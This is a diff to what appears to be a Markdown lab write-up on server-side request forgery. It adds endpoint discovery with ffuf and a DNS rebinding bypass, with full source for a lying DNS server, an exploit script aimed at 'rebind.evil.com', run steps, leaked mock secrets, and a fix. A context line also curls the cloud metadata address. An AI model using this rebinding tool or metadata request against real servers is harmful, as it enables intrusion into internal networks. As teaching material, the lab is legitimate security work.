@@ -374,9 +374,232 @@ curl "http://localhost:3000/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 ---
 
+## Endpoint Discovery — Finding SSRF in the Wild
+
+Nobody labels their endpoints "vulnerable". An attacker has to find them first.
+
+### How SSRF endpoints appear in real apps
+
+| Feature | Why it fetches URLs |
+|---|---|
+| PDF / screenshot generator | Server fetches the page to render it |
+| Import from URL | Server downloads the file |
+| Link preview / unfurl | Server fetches metadata |
+| Webhooks | Server sends requests to a callback URL |
+| Image upload by URL | Server downloads the image |
+
+None of these developers thought they were writing a vulnerability. They just built a feature.
+
+### Finding endpoints with ffuf
+
+```bash
+# Install ffuf
+sudo apt install ffuf
+
+# Find the wordlist
+find / -name "common.txt" 2>/dev/null
+# /usr/share/dirb/wordlists/common.txt
+
+# Scan for endpoints
+ffuf -u "http://localhost:3000/FUZZ" -w /usr/share/dirb/wordlists/common.txt -c -mc 200,301,302,400,401,403,405,500
+```
+
+The common wordlist won't always have SSRF-specific endpoints. Use a custom one:
+
+```bash
+cat > ssrf-wordlist.txt << 'EOF'
+fetch
+proxy
+preview
+screenshot
+pdf
+import
+webhook
+redirect
+request
+load
+get
+url
+download
+EOF
+
+ffuf -u "http://localhost:3000/FUZZ" -w ssrf-wordlist.txt -c -mc 200,301,302,400,401,403,405,500
+```
+
+### Results on our server
+
+```
+fetch   [Status: 400, Size: 30]  → endpoint exists, needs parameters
+```
+
+Status 400 + "url param required" = SSRF candidate. From here an attacker knows exactly what to send.
+
+---
+
+## Bypass #1 — DNS Rebinding
+
+### What it is
+
+The patched server validates a URL by resolving its hostname to an IP, checking it's not private, then making the request. The problem — **validation and request are two separate DNS lookups**.
+
+DNS Rebinding exploits the gap between those two lookups. The attacker controls a DNS server that gives different answers each time:
+
+```
+Lookup #1 (validation) → 1.3.3.7    → not private → passes ✅
+Lookup #2 (request)    → 127.0.0.1  → internal    → hits internal network ✅
+```
+
+### Files
+
+**`dns-rebind.js`** — a fake DNS server that lies on the second answer:
+
+```js
+const DNS = require('dns2');
+const { Packet } = DNS;
+
+let requestCount = {};
+
+const server = DNS.createServer({
+  udp: true,
+  handle: (request, send, rinfo) => {
+    const response = Packet.createResponseFromRequest(request);
+    const [question] = request.questions;
+    const { name } = question;
+
+    requestCount[name] = (requestCount[name] || 0) + 1;
+
+    // First request → public IP (passes validation)
+    // Second request → 127.0.0.1 (hits internal network)
+    const ip = requestCount[name] <= 1 ? '1.3.3.7' : '127.0.0.1';
+
+    console.log(`[DNS] ${name} → ${ip} (request #${requestCount[name]})`);
+
+    response.answers.push({
+      name,
+      type: Packet.TYPE.A,
+      class: Packet.CLASS.IN,
+      ttl: 0, // no caching — forces re-resolution every time
+      address: ip
+    });
+
+    send(response);
+  }
+});
+
+server.listen({ udp: 5333 });
+console.log('DNS rebind server listening on port 5333');
+```
+
+**`attack.js`** — simulates the two DNS lookups a vulnerable server makes:
+
+```js
+const dns = require('dns');
+const dnsPromises = dns.promises;
+const axios = require('axios');
+const { URL } = require('url');
+
+// Tell Node to use our fake DNS server instead of the real one
+dns.setServers(['127.0.0.1:5333']);
+
+const BLOCKED_RANGES = [
+  /^127\./, /^10\./, /^192\.168\./,
+  /^172\.(1[6-9]|2\d|3[01])\./, /^169\.254\./, /^::1$/, /^0\.0\.0\.0$/,
+];
+
+const isPrivateIP = (ip) => BLOCKED_RANGES.some(r => r.test(ip));
+
+async function exploit() {
+  const target = 'http://rebind.evil.com:8888/admin';
+  const parsed = new URL(target);
+
+  // First resolution — validation (gets 1.3.3.7)
+  const first = await dnsPromises.resolve4(parsed.hostname);
+  console.log('[VALIDATE] resolved to:', first);
+
+  for (const address of first) {
+    if (isPrivateIP(address)) throw new Error(`Blocked: ${address} is private`);
+  }
+  console.log('[*] Validation passed!');
+
+  // Second resolution — attack (gets 127.0.0.1)
+  const second = await dnsPromises.resolve4(parsed.hostname);
+  console.log('[ATTACK] resolved to:', second);
+
+  const attackURL = `http://${second[0]}:8888/admin`;
+  const response = await axios.get(attackURL);
+  console.log('[+] GOT INTERNAL DATA:', response.data);
+}
+
+exploit().catch(e => console.log('[-] Failed:', e.message));
+```
+
+### Test the DNS server
+
+```bash
+# Verify it alternates answers
+dig @127.0.0.1 -p 5333 rebind.evil.com  # → 1.3.3.7
+dig @127.0.0.1 -p 5333 rebind.evil.com  # → 127.0.0.1
+```
+
+### Run the attack
+
+```bash
+# Terminal 1
+node dns-rebind.js
+
+# Terminal 2
+node secret-server.js
+
+# Terminal 3 — restart dns-rebind first to reset counter, then:
+node attack.js
+```
+
+### Result
+
+```
+[VALIDATE] resolved to: [ '1.3.3.7' ]
+[*] Validation passed!
+[ATTACK] resolved to: [ '127.0.0.1' ]
+[*] Requesting: http://127.0.0.1:8888/admin
+[+] GOT INTERNAL DATA: {
+  message: 'TOP SECRET ADMIN PANEL',
+  users: [ 'root', 'admin', 'dbuser' ],
+  db_password: 'sup3r_s3cr3t_123',
+  internal_ip: '192.168.1.100'
+}
+```
+
+The patched server was bypassed completely.
+
+### The fix for DNS Rebinding
+
+Resolve **once**, use that IP for everything — never re-resolve the hostname:
+
+```js
+const addresses = await dnsPromises.resolve4(parsed.hostname);
+const ip = addresses[0];
+
+if (isPrivateIP(ip)) throw new Error('Blocked');
+
+// Connect directly to the IP — never ask DNS again
+const response = await axios.get(`http://${ip}:${parsed.port}${parsed.pathname}`, {
+  headers: { Host: parsed.hostname }
+});
+```
+
+### Key concepts
+
+| Term | Meaning |
+|---|---|
+| **TTL** | Time To Live — how long a DNS answer is cached. TTL 0 = no cache, forces re-resolution |
+| **DNS rebinding** | A domain that returns different IPs on different lookups |
+| **Two-lookup gap** | Validate uses lookup #1, request triggers lookup #2 — attacker controls both |
+
+---
+
 ## What's Next — Bypass Techniques
 
-- [ ] **DNS Rebinding** — bypass protection using a domain that switches IPs after validation
+- [x] **DNS Rebinding** ✅
 - [ ] **Redirect-based bypass** — public server that redirects to `127.0.0.1`
 - [ ] **Protocol smuggling** — `file://`, `gopher://`, `dict://` payloads
 
